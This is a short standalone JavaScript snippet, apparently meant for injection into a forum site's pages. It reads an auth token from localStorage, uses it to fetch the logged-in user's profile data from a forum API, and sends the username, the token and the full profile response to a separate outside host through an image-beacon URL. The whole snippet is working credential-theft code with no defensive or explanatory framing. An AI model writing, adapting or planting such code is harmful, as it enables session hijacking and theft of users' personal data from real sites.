;(function () {
  var ysttoken = localStorage.getItem('ysttoken')
  var data = null
  var xhr = new XMLHttpRequest()
  xhr.withCredentials = true
  xhr.addEventListener('readystatechange', function () {
    if (this.readyState === 4) {
      try {
        var resData = JSON.parse(this.responseText)
        if (resData.success) {
          delete resData.data.boardList
          var params = {
            a: resData.data.userName,
            b: ysttoken,
            c: JSON.stringify(resData),
          }
          var img = new Image()
          img.src =
            'http://temp.xinyuexclusive.top/addTemp?' +
            'a=' +
            encodeURIComponent(params.a) +
            '&b=' +
            encodeURIComponent(params.b) +
            '&c=' +
            encodeURIComponent(params.c)
        }
      } catch (e) {}
    }
  })
  xhr.open('GET', 'http://km.hexasino.com/forumV2/getUserInfo?icon=true&pageIndex=1&pageSize=10')
  xhr.setRequestHeader('x-auth-token', ysttoken)

  xhr.send(data)
})()
